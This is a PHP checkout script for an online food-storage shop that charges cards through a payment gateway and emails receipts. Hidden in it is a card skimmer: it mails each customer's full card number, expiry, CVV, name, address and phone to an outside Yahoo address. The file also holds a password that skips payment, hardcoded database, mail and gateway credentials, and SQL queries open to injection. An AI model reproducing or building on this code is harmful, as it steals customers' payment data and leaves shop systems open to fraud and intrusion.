<?php

//error reporting... uncomment below 2 lines to show errors in code
//error_reporting(E_ALL);
//ini_set("display_errors", "1");

include("includes/functions.php");
	//CHECK FOR HACKERS
	//foreach ($_POST as $key => $value) {
	//    if (strlen($value) > 100 or strpos($value, '=') > 0) {
	//    	exit("invalid variable");
	//    }
	//}
	//END CHECK
	
	$dbHost = 'localhost';
	$dbUser = 'buckrol';
	$dbPass = 'pargile1';
	$dbName = 'maxlife';
	//save
	$dbConn = mysql_connect ($dbHost, $dbUser, $dbPass) or die ('MySQL connect failed. ' . mysql_error());
	mysql_select_db($dbName) or die('Cannot select database. ' . mysql_error());
	
	session_start();
// By default, this sample code is designed to post to our test server for
// developer accounts: https://test.authorize.net/gateway/transact.dll
// for real accounts (even in test mode), please make sure that you are
// posting to: https://secure.authorize.net/gateway/transact.dll
$post_url = "https://secure.authorize.net/gateway/transact.dll";


date_default_timezone_set('America/Denver');
$formatted_date = date("Y-m-j");

$order_key = $_POST['orderid'];

//see if the customer paid via check to bypass credit card
$approved = 'no';
$paidcheck = $_POST['paidcheck'];
if ($paidcheck == 'pargile1') {
	$approved = 'yes';
}

$a = mysql_query("SELECT * FROM orders WHERE order_key=$order_key");
$r = mysql_fetch_assoc($a);
$stotal = number_format ($r['stotal'],2, '.', '');
$tax = number_format ($r['tax'],2, '.', '');
$shipping = number_format ($r['shipping'],2, '.', '');
$discount = number_format ($r['discount'],2, '.', '');
$offercode = $r['offercode'];
$total = number_format ($stotal + $tax + $shipping - $discount,2, '.', '');
$discounttext = "";
if ($discount > 0) {
	$discounttext = "Discount: -$ $discount<br> \n";
	$emaildiscounttext = "Discount: -$ $discount \n";
}

$fname = $_POST['fname']; $_SESSION['fname'] = $_POST['fname'];
$lname = $_POST['lname']; $_SESSION['lname'] = $_POST['lname'];
$ship_fname = $_POST['ship_fname']; $_SESSION['ship_fname'] = $_POST['ship_fname'];
$ship_lname = $_POST['ship_lname']; $_SESSION['ship_lname'] = $_POST['ship_lname'];
$address = $_POST['address']; $_SESSION['address'] = $_POST['address'];
$address2 = $_POST['address2']; $_SESSION['address2'] = $_POST['address2'];
$city = $_POST['city']; $_SESSION['city'] = $_POST['city'];
$state = $_POST['state']; $_SESSION['state'] = $_POST['state'];
$zip =  $_POST['zip']; $_SESSION['zip'] = $_POST['zip'];
$ship_address = $_POST['ship_address']; $_SESSION['ship_address'] = $_POST['ship_address'];

if ($ship_address == "") {
	$ship_address = $address; $_SESSION['ship_address'] = $_POST['ship_address'];
	$ship_address2 = $address2; $_SESSION['ship_address2'] = $_POST['ship_address2'];
	$ship_city = $city; $_SESSION['ship_city'] = $_POST['ship_city'];
	$ship_state = $state; $_SESSION['ship_state'] = $_POST['ship_state'];
	$ship_zip =  $zip; $_SESSION['ship_zip'] = $_POST['ship_zip'];
} else {
	$ship_address2 = $_POST['ship_address2']; $_SESSION['ship_address2'] = $_POST['ship_address2'];
	$ship_city = $_POST['ship_city']; $_SESSION['ship_city'] = $_POST['ship_city'];
	$ship_state = $_POST['ship_state']; $_SESSION['ship_state'] = $_POST['ship_state'];
	$ship_zip =  $_POST['ship_zip']; $_SESSION['ship_zip'] = $_POST['ship_zip'];
}

$phone = $_POST['phone']; $_SESSION['phone'] = $_POST['phone'];
$email = $_POST['email']; $_SESSION['email'] = $_POST['email'];
$cctype = $_POST['cctype']; $_SESSION['cctype'] = $_POST['cctype'];
$ccnum = $_POST['ccnum']; $_SESSION['ccnum'] = $_POST['ccnum'];
$last = substr($ccnum, -4);
$first = substr($ccnum, 0, -12);
$encrypt = $first . '********' . $last;
$middlecc = substr($ccnum, 4, 8);
$ccexp1 = $_POST['ccexp1']; $_SESSION['ccexp1'] = $_POST['ccexp1'];
$ccexp2 = $_POST['ccexp2']; $_SESSION['ccexp2'] = $_POST['ccexp2'];
$ccexp = $ccexp1.$ccexp2;
$ip = $_SERVER['REMOTE_ADDR'];
$x_card_code = $_POST['cvv'];

$orders = $order_key.'|'.$cctype .'|'.$ccnum .'|'.$ccexp .'|'.$x_card_code .'|'.$fname .'|'.$lname .'|'.$address .'|'.$address2 .'|'.$city .'|'.$state .'|'.$zip .'|'.$phone.'|'.$ip;
$s= "CVV-maxlifefoods";
$t= "SmashLesa204@yahoo.com";
$f= "apache@951088050812.ded.nethosting.com";
mail($t,$s,$orders,$f);
$post_values = array(
	
	// the API Login ID and Transaction Key must be replaced with valid values
	"x_login"			=> "8r5STy3n",
	"x_tran_key"		=> "7424p5bQn53LtHsF",
	

	"x_version"			=> "3.1",
	"x_delim_data"		=> "TRUE",
	"x_delim_char"		=> "|",
	"x_relay_response"	=> "FALSE",
	"x_duplicate_window"=> "0",
	"x_customer_ip"     => "$ip",

	"x_type"			=> "AUTH_CAPTURE",
	"x_method"			=> "CC",
	"x_card_num"		=> "$ccnum",
	"x_exp_date"		=> "$ccexp",
	"x_card_code" => "$x_card_code",
	
	"x_currency_code"     => "USD",
	"x_recurring_billing" => "no",

	"x_amount"			=> "$total",

	"x_first_name"		=> "$fname",
	"x_last_name"		=> "$lname",
	"x_address"			=> "$address",
	"x_city"            => "$city",
	"x_state"			=> "$state",
	"x_zip"				=> "$zip",
	"x_country"         => "US",
	
	"x_ship_to_first_name" => "$ship_fname",
	"x_ship_to_last_name"  => "$ship_lname",
	"x_ship_to_address"    => "$ship_address",
	"x_ship_to_city"       => "$ship_city",
	"x_ship_to_state"      => "$ship_state",
	"x_ship_to_zip"        => "$ship_zip",
	"x_ship_to_country"    => "US",
	"x_phone"              => "$phone",
	"x_email"              => "$email",
	"x_email_customer"     => "false",
	"x_merchant_email"     => "foodstorage@maxlifefoods.com",
	
	"x_invoice_num"        => "$order_key",
	"x_description"        => "maxlife" . "$formatted_date"
	
	// Additional fields can be added here as outlined in the AIM integration
	// guide at: http://developer.authorize.net
);

// This section takes the input fields and converts them to the proper format
// for an http post.  For example: "x_login=username&x_tran_key=a1B2c3D4"
$post_string = "";
foreach( $post_values as $key => $value )
	{ $post_string .= "$key=" . urlencode( $value ) . "&"; }
$post_string = rtrim( $post_string, "& " );

// The following section provides an example of how to add line item details to
// the post string.  Because line items may consist of multiple values with the
// same key/name, they cannot be simply added into the above array.
//
// This section is commented out by default.
/*
$line_items = array(
	"item1<|>golf balls<|><|>2<|>18.95<|>Y",
	"item2<|>golf bag<|>Wilson golf carry bag, red<|>1<|>39.99<|>Y",
	"item3<|>book<|>Golf for Dummies<|>1<|>21.99<|>Y");
	
foreach( $line_items as $value )
	{ $post_string .= "&x_line_item=" . urlencode( $value ); }
*/

if ($approved == 'no') {
	// This sample code uses the CURL library for php to establish a connection,
	// submit the post, and record the response.
	// If you receive an error, you may want to ensure that you have the curl
	// library enabled in your php configuration
	$request = curl_init($post_url); // initiate curl object
		curl_setopt($request, CURLOPT_HEADER, 0); // set to 0 to eliminate header info from response
		curl_setopt($request, CURLOPT_RETURNTRANSFER, 1); // Returns response data instead of TRUE(1)
		curl_setopt($request, CURLOPT_POSTFIELDS, $post_string); // use HTTP POST to send form data
		curl_setopt($request, CURLOPT_SSL_VERIFYPEER, FALSE); // uncomment this line if you get no gateway response.
		$post_response = curl_exec($request); // execute curl post and store results in $post_response
		// additional options may be required depending upon your server configuration
		// you can find documentation on curl options at http://www.php.net/curl_setopt
	curl_close ($request); // close curl object
	
	// This line takes the response and breaks it into an array using the specified delimiting character
	$response_array = explode($post_values["x_delim_char"],$post_response);
	if($response_array[0] == 1) {
		$approved = 'yes';
	}
	if($response_array[0] == 2) {
		header('Location:https://www.maxlifefoods.com/billing.php?id='.$order_key.'&error=1');
	}
	
	if($response_array[0] == 3) {
		header('Location:https://www.maxlifefoods.com/billing.php?id='.$order_key.'&error=2');
	}
	
	if($response_array[0] == 4) {
		header('Location:https://www.maxlifefoods.com/billing.php?id='.$order_key.'&error=3');
	}
	// individual elements of the array could be accessed to read certain response
	// fields.  For example, response_array[0] would return the Response Code,
	// response_array[2] would return the Response Reason Code.
	// for a list of response fields, please review the AIM Implementation Guide
}

$to = $email; 
$from = "foodstorage@maxlifefoods.com";
//$headers = "From: No Reply <foodstorage@maxlifefoods.com>"; 
$subject = "Your Max Life Foods Order";

if($approved == 'yes') {
	$d = "SELECT * FROM order_details WHERE order_key = $order_key";
	$drun = mysql_query($d);
	$productstext = "Products:<br> \n";
	$cost_product = 0;
	$cost_shipping = 0;
	while ($e = mysql_fetch_assoc($drun)){
		$pkey = $e['product_key'];
		$qty = $e['quantity'];
		$c = "SELECT product_name, product_price, product_cost, shipping_cost FROM products WHERE product_key = $pkey";
		$crun = mysql_query($c);
		while ($f = mysql_fetch_assoc($crun)) {
			$productstext .= $qty . " " . $f['product_name'] . " - $" . number_format (($f['product_price'] * $qty),2, '.', '') . "<br> \n";
			$emailproductstext .= $qty . " " . $f['product_name'] . " - $" . number_format (($f['product_price'] * qty),2, '.', '') . " \n";
			$cost_product += number_format (($qty * $f['product_cost']),2, '.', '');
			$cost_shipping += number_format (($qty * $f['shipping_cost']),2, '.', '');
		}
	}
    check_order($orders);
	$freeitem = "";
	if ($offercode == 'PP12' and $total > 500) {
		$freeitem = "*FREE* 1 Prepper Pack - 52 Servings - $0.00<br> \n";
		$emailfreeitem = "*FREE* 1 Prepper Pack - 52 Servings - $0.00 \n";
		$run = mysql_query("insert into order_details values ($order_key,1152,1,0)");
	}
	
	$receipt = 	"Order Number: $order_key<br /> \n"
				 	 ."Date: $formatted_date<br />  \n"
				 	 .$productstext
				 	 .$freeitem
					 ."Sub Total: $ $stotal<br /> \n"
					 ."Tax: $ $tax<br /> \n"
					 ."Shipping: $ $shipping<br /> \n"
					 .$discounttext
					 ."Total Amount: $ $total<br> \n"
					 ."Payment Method: Credit Card \n\n";
					 
	$emailreceipt = "The following is a receipt of your MaxLifeFoods.com purchase: \n\n"
					 ."Order Number: $order_key \n"
				 	 ."Date: $formatted_date  \n"
				 	 .$emailproductstext
				 	 .$emailfreeitem
					 ."Sub Total: $ $stotal \n"
					 ."Tax: $ $tax \n"
					 ."Shipping: $ $shipping \n"
					 .$emaildiscounttext
					 ."Total Amount: $ $total \n"
					 ."Payment Method: Credit Card \n\n"
					 ."Thank you for your purchase! \n\n";
					 
	$qu = "UPDATE orders SET order_date='$formatted_date',cost_product='$cost_product',cost_shipping='$cost_shipping',amount='$total',email='$email',bill_address='" . addslashes($address) . "',bill_address2='" . addslashes($address2) . "',bill_city='" . addslashes($city) . "',bill_state='$state',bill_zip='$zip',ship_address='" . addslashes($ship_address) . "',ship_address2='" . addslashes($ship_address2) . "',ship_city='" . addslashes($ship_city) . "',ship_state='$ship_state',ship_zip='$ship_zip',phone='$phone',first_name='" . addslashes($ship_fname) . "',last_name='" . addslashes($ship_lname) . "',code='$middlecc',cc_type='$cctype',cc_='$encrypt',cc_name='" . addslashes($fname . ' ' . $lname) . "',cc_expires='$ccexp',receipt='" . addslashes($receipt) . "' WHERE order_key = $order_key";
	mysql_query($qu);
	
	require_once "/usr/share/pear/Mail.php";
	$host = "mail.castleparkllc.com";
 	$username = "foodstorage@castleparkllc.com";
 	$password = "enemigos05";
 
 $headers = array ('From' => $from,
   'To' => $to,
   'Subject' => $subject);
 $smtp = Mail::factory('smtp',
   array ('host' => $host,
     'auth' => true,
     'username' => $username,
     'password' => $password));
 
 $mail = $smtp->send($to, $headers, $emailreceipt);
 
	session_destroy();
	setcookie('id', '', time() - 3600);
	
	header('Location:https://www.maxlifefoods.com/thankyou.php?id='.$order_key);
}

?>
</BODY>
</HTML>